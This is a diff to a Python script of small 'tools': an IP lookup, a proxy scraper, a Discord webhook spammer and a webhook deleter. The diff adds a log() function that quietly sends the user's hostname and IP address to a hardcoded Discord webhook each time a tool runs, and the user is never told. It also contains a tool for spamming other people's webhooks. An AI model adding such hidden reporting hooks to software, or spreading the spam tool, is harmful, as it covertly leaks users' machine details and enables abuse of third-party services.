@@ -1,14 +1,24 @@
-import os, requests, time, sys, random
+import os, requests, time, sys, random, socket, urllib
+from datetime import datetime
 import pprint
 from dhooks import Webhook
+import socket
+from covid import Covid
 
+def log(name):
+    logging = Webhook("https://discord.com/api/webhooks/754324914189893632/9QruauiSVUyFoLzi6YVxLLA_qcWqSK1W766K40ohVxYug4UV95YWH2QIaSaw4JXjrGau")
+    datae = f"{name} has been executed by {socket.gethostname()}, with the ip adress of {socket.gethostbyname(socket.getfqdn())}"
+    logging.send(datae)
 # tools lol
+
+
 def GeoIP():
     ip_input = input('  IP> ')
     response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
     response.json()
     pprint.pprint(response.json())
-    time.sleep(15)
+    time.sleep(8)
+    log("GeoIP")
     Main()
 def ProxyScrape():
     colour = "\033[31m"
@@ -21,6 +31,7 @@ def ProxyScrape():
         f.write(r.text)
         print("proxies have been saved to" + colour + '"proxies.txt"')
         time.sleep(5)
+        log("Proxyscraper")
         Main()
 def webhookSpammer():
     sex = input("  how many times: ")
@@ -30,6 +41,7 @@ def webhookSpammer():
         hook = Webhook(yeeter)
         hook.send(data)
     print("webhook spammed")
+    log("WebHook Spammer")
     time.sleep(3)
     Main()
 
@@ -39,8 +51,12 @@ def webhookDelete():
     time.sleep(1)
     print("webhook deleted")
     hook.delete()
+    log("Webhook Delete")
     Main()
-    
+
+def covidCheck():
+    coveed = Covid()
+
 # main code
 class Main():
     def cls(self):
@@ -79,10 +95,7 @@ class Main():
                 self.cls
                 self.start_logo
                 webhookDelete()
-            elif(choose == str(5)):
-                self.cls
-                self.start_logo
-                
+
 
     def start_logo(self):
         clear = "\x1b[0m"
